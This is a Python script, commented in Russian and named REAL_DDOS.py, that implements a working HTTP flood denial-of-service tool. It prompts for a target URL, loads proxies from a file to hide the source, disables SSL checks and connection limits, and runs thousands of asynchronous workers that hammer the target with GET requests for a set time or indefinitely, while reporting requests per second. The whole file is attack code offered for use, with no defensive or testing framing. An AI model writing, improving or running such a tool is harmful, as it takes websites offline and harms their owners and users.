# REAL_DDOS.py
# ТРАФИК ИДЁТ 100% | ЛОГИ КАЖДОГО ЗАПРОСА | ПРОКСИ | АСИНХРОННО

import asyncio
import aiohttp
import random
import time
import logging
from collections import Counter

# ОТКЛЮЧАЕМ ПРЕДУПРЕЖДЕНИЯ
logging.getLogger("aiohttp").setLevel(logging.CRITICAL)

# ================== НАСТРОЙКИ ==================
PROXY_FILE = 'http.txt'
TARGET = ""
CONCURRENCY = 3000
DURATION = 30
USE_PROXY = True
SHOW_LOGS = True  # True = каждый 100-й запрос в консоль
# ===============================================

proxies_list = []
stats = Counter()
stop_event = asyncio.Event()

# === ЗАГРУЗКА ПРОКСИ ===
async def load_proxies():
    global proxies_list, USE_PROXY
    try:
        with open(PROXY_FILE, 'r', encoding='utf-8') as f:
            lines = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        for p in lines:
            if p.startswith('socks5://'):
                proxies_list.append(p)
            elif p.startswith('http'):
                proxies_list.append(p)
            else:
                proxies_list.append(f'http://{p}')
        print(f"[+] Живых прокси: {len(proxies_list)}")
        if not proxies_list:
            USE_PROXY = False
    except:
        print("[-] Прокси не загружены → БЕЗ ПРОКСИ")
        USE_PROXY = False

# === РАБОЧИЙ С ЛОГИРОВАНИЕМ ===
async def worker(session, worker_id):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'Accept': '*/*',
        'Connection': 'keep-alive'
    }
    proxy = None
    count = 0

    while not stop_event.is_set():
        try:
            if USE_PROXY and proxies_list:
                proxy = random.choice(proxies_list)

            resp = await session.get(
                TARGET,
                proxy=proxy,
                headers=headers,
                timeout=10
            )
            status = resp.status
            await resp.read()

            count += 1
            stats['total'] += 1
            stats[f'status_{status}'] += 1

            # ЛОГИ КАЖДОГО 100-го запроса
            if SHOW_LOGS and count % 100 == 0:
                proxy_ip = proxy.split('@')[-1].split(':')[0] if proxy else "ПРЯМОЙ"
                print(f"[+] W{worker_id} | {count} | {status} | {proxy_ip}")

        except Exception as e:
            stats['errors'] += 1
            if USE_PROXY and proxies_list:
                proxy = random.choice(proxies_list)

# === СТАТИСТИКА В РЕАЛЬНОМ ВРЕМЕНИ ===
async def print_stats():
    while not stop_event.is_set():
        await asyncio.sleep(5)
        if stats['total'] > 0:
            rps = stats['total'] / (time.time() - start_time)
            print(f"\n[СТАТИСТИКА] RPS: {rps:,.0f} | Успех: {stats['status_200']} | Ошибки: {stats['errors']}")

# === ОСНОВНОЙ ЦИКЛ ===
async def main():
    global TARGET, CONCURRENCY, DURATION, start_time

    print("="*60)
    print("REAL DDoS — ТРАФИК 100% ВИДЕН")
    print("="*60)

    TARGET = input("Цель: ").strip()
    if not TARGET.startswith("http"):
        TARGET = "https://" + TARGET

    try:
        CONCURRENCY = int(input("Соединений (1000-5000): ") or "3000")
        DURATION = int(input("Секунд (0=∞): ") or "30")
    except:
        pass

    await load_proxies()

    connector = aiohttp.TCPConnector(
        limit=0,
        limit_per_host=0,
        ssl=False,
        keepalive_timeout=60
    )
    timeout = aiohttp.ClientTimeout(total=15)

    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        print(f"\nЗАПУСК: {CONCURRENCY} соединений → {TARGET}")
        print(f"Прокси: {'ВКЛ' if USE_PROXY else 'ВЫКЛ'}")
        await asyncio.sleep(1)

        global start_time
        start_time = time.time()

        # Запуск статистики
        asyncio.create_task(print_stats())

        # Запуск рабочих
        tasks = [worker(session, i) for i in range(1, CONCURRENCY + 1)]
        
        try:
            if DURATION > 0:
                await asyncio.wait_for(asyncio.gather(*tasks), DURATION)
            else:
                await asyncio.gather(*tasks)
        except:
            pass
        finally:
            stop_event.set()

        # Финальная статистика
        elapsed = time.time() - start_time
        rps = stats['total'] / elapsed
        print(f"\nФИНАЛ: {elapsed:.1f}с | {stats['total']:,} запросов | {rps:,.0f} RPS")

# === ЗАПУСК ===
if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nОстановлено.")